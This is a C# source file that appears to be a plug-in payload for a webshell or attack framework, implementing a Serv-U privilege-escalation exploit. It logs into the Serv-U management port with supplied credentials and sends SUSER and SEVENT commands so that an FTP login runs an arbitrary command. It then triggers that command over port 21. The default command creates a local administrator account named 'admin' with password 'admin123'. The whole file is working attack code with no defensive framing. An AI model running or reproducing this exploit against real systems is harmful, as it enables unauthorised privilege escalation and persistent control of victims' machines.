using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Text;
using System.Text.RegularExpressions;

public class payload
{
    public payload() {}

    public string Execute(object param)
    {
        if (!(param is Dictionary<string, object> mapParam))
        {
            return "[-] ERROR: Invalid parameter type. Expected Dictionary.";
        }
        
        if (!mapParam.TryGetValue("json", out var jsonValue) || string.IsNullOrEmpty(jsonValue?.ToString()))
        {
            return "[-] ERROR: JSON data is empty.";
        }

        string szJson = jsonValue.ToString();
        string host = fnGetJsonValue(szJson, "ip");
        if (string.IsNullOrEmpty(host)) host = "127.0.0.1";

        int port = 43958;
        string portStr = fnGetJsonValue(szJson, "port");
        if (!string.IsNullOrEmpty(portStr) && int.TryParse(portStr, out int parsedPort))
        {
            port = parsedPort;
        }

        string user = fnGetJsonValue(szJson, "user");
        string pass = fnGetJsonValue(szJson, "pass");
        string cmd = fnGetJsonValue(szJson, "cmd");

        if (string.IsNullOrEmpty(user) || string.IsNullOrEmpty(pass))
        {
            return "[-] ERROR: Username and password are required.";
        }

        return RunServUExploit(host, port, user, pass, cmd);
    }

    private string RunServUExploit(string host, int port, string user, string pass, string cmd)
    {
        StringBuilder sb = new StringBuilder();

        try
        {
            using (TcpClient client = new TcpClient())
            {
                IAsyncResult ar = client.BeginConnect(host, port, null, null);
                bool success = ar.AsyncWaitHandle.WaitOne(TimeSpan.FromSeconds(5));
                if (!success || !client.Connected)
                {
                    return $"[-] Failed to connect to Serv-U management port at {host}:{port}.";
                }

                sb.AppendLine("[+] Successfully connected to Serv-U management port...");

                using (NetworkStream stream = client.GetStream())
                {
                    using (StreamReader reader = new StreamReader(stream, Encoding.ASCII))
                    {
                        using (StreamWriter writer = new StreamWriter(stream, Encoding.ASCII) { AutoFlush = true })
                        {
                            reader.ReadLine();

                            writer.Write($"USER {user}\r\n");
                            reader.ReadLine();

                            writer.Write($"PASS {pass}\r\n");
                            string response = reader.ReadLine();

                            if (string.IsNullOrEmpty(response) || 
                                (response.IndexOf("230", StringComparison.Ordinal) == -1 && 
                                 response.IndexOf("Logged in", StringComparison.OrdinalIgnoreCase) == -1))
                            {
                                return "[-] Login failed: Administrative credentials incorrect or changed.";
                            }

                            sb.AppendLine("[+] Successfully authenticated into Serv-U management interface!");

                            writer.Write($"SUSER {user}|{pass}|Y|N\r\n");
                            reader.ReadLine();

                            if (string.IsNullOrEmpty(cmd))
                            {
                                cmd = "cmd.exe /c net user admin admin123 /add && net localgroup administrators admin /add";
                            }
                            writer.Write($"SEVENT {user}|0|0|{cmd}\r\n");
                            reader.ReadLine();

                            sb.AppendLine("[+] Malicious FTP account and Event trigger configured successfully.");
                        }
                    }
                }
            }

            sb.AppendLine("[+] Attempting to trigger the payload via standard FTP port (21)...");
            try
            {
                using (TcpClient ftpClient = new TcpClient())
                {
                    ftpClient.Connect("127.0.0.1", 21);
                    using (NetworkStream ftpStream = ftpClient.GetStream())
                    {
                        using (StreamReader ftpReader = new StreamReader(ftpStream, Encoding.ASCII))
                        {
                            using (StreamWriter ftpWriter = new StreamWriter(ftpStream, Encoding.ASCII) { AutoFlush = true })
                            {
                                ftpReader.ReadLine();
                                ftpWriter.Write($"USER {user}\r\n");
                                ftpReader.ReadLine();
                                ftpWriter.Write($"PASS {pass}\r\n");
                                ftpReader.ReadLine();
                                sb.AppendLine("[+] Payload triggered successfully!");
                            }
                        }
                    }
                }
            }
            catch
            {
                sb.AppendLine("[-] Could not connect to port 21. The event will trigger whenever the account is accessed.");
            }

            return "[+] SUCCESS\n" + sb.ToString();
        }
        catch (Exception ex)
        {
            return "[-] Exception: " + ex.Message;
        }
    }

    private string fnGetJsonValue(string json, string key)
    {
        Match match = Regex.Match(json, $"\"{key}\"\\s*:\\s*\"(.*?)\"");
        if (match.Success) return match.Groups[1].Value;

        match = Regex.Match(json, $"\"{key}\"\\s*:\\s*([^,\\}}\\]]+)");
        if (match.Success) return match.Groups[1].Value.Trim().Replace("\"", "");

        return "";
    }
}